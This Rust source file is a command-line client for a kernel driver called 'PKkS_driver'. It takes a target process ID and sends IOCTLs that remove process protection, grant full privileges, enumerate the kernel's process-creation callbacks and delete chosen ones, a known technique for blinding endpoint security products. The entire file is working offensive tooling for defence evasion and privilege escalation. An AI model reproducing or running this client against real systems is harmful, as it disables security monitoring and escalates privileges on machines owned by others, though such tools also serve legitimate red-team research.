use clap::Parser;
use std::fs::OpenOptions;
use std::os::windows::io::AsRawHandle;

use winioctl::{ioctl_none, ioctl_read, ioctl_readwrite, ioctl_write};
use winioctl::{DeviceType, Error};

pub type ProcessId = usize;

#[derive(Copy, Clone, Debug)]
pub struct CallbackInformation {
    module_name: [u8; 256],
    pointer: u64,
}

impl Default for CallbackInformation {
    fn default() -> Self {
        Self {
            module_name: [0; 256],
            pointer: 0,
        }
    }
}
pub type ProcessCallbackInfo = [CallbackInformation; 64];

const IOCTL_SET_TARGET: u32 = 0x803;
const IOCTL_UNPROTECT_TARGET: u32 = 0x804;
const IOCTL_PRIVILEGE_TARGET: u32 = 0x805;
const IOCTL_ENUM_PROCESS_CALLBACK: u32 = 0x806;
const IOCTL_RM_PROCESS_CALLBACK: u32 = 0x807;

ioctl_write!(
    ioctl_set_target,
    DeviceType::Unknown,
    IOCTL_SET_TARGET,
    ProcessId
);

ioctl_write!(
    ioctl_rm_process_callback,
    DeviceType::Unknown,
    IOCTL_RM_PROCESS_CALLBACK,
    u8
);

ioctl_none!(
    ioctl_unprotect_target,
    DeviceType::Unknown,
    IOCTL_UNPROTECT_TARGET
);
ioctl_none!(
    ioctl_full_priv_target,
    DeviceType::Unknown,
    IOCTL_PRIVILEGE_TARGET
);
ioctl_readwrite!(
    ioctl_enum_process_callback,
    DeviceType::Unknown,
    IOCTL_ENUM_PROCESS_CALLBACK,
    ProcessCallbackInfo
);

#[derive(Parser, Debug)]
#[command(author = "SandBlastx" , version = "1.0", about, long_about = None)]
struct Args {
    /// PID of the target process
    #[arg(short, long)]
    pid: ProcessId,

    /// Enum the callback
    #[arg(short, long)]
    callback_enum: bool,

    /// Remove process callback
    #[arg(long)]
    callback_index: Option<u8>,

    /// Unprotect current target
    #[arg(short, long)]
    unprotect: bool,

    /// Set full privilege on target
    #[arg(short, long)]
    full_priv: bool,
}

fn main() -> Result<(), Error> {
    let args = Args::parse();

    let file = OpenOptions::new()
        .read(true)
        .write(true)
        .create(false)
        .open("\\??\\PKkS_driver")?;
    let pid: ProcessId = args.pid;
    let mut p_callback_info = [CallbackInformation::default(); 64];

    println!("[+] Setting target pid to {}", pid);

    unsafe {
        ioctl_set_target(file.as_raw_handle(), &pid)?;
    }

    match args {
        Args {
            full_priv: true,
            unprotect: false,
            callback_enum: false,
            callback_index: None, .. } => {
            print!("[+] Enabling full privilege on target");
            unsafe {
                ioctl_full_priv_target(file.as_raw_handle())?;
            }
        }
        Args {
            full_priv: false,
            unprotect: true,
            callback_enum: false,
            callback_index: None, .. } => {
            print!("[+] Unprotecting target");
            unsafe {
                ioctl_unprotect_target(file.as_raw_handle())?;
            }
        }
        Args {
            full_priv: false,
            unprotect: false,
            callback_enum: true,
            callback_index: None, .. } => {
            unsafe {
                ioctl_enum_process_callback(
                    file.as_raw_handle(),
                    p_callback_info.as_mut_ptr() as _,
                )?;
            }

            println!("[*] List of Process Callback");
            for (n, i) in p_callback_info.iter().enumerate() {
                if i.pointer > 0 {
                    println!(
                        "[{}] {:x} from {}",
                        n,
                        i.pointer,
                        core::str::from_utf8(&i.module_name).unwrap()
                    );
                }
            }
        }
        Args {
            full_priv: false,
            unprotect: false,
            callback_enum: false,
            callback_index: Some(index), .. } => {
            let value = index;
            print!("[+] Removing {:?} process callback", index);
            unsafe {
                ioctl_rm_process_callback(file.as_raw_handle(), &value )?;
            }
        }
        _ => {
            
            println!("[!] Invalid combination of arguments.");
        }
    }

    println!("[*] SUCCESS");
    Ok(())
}
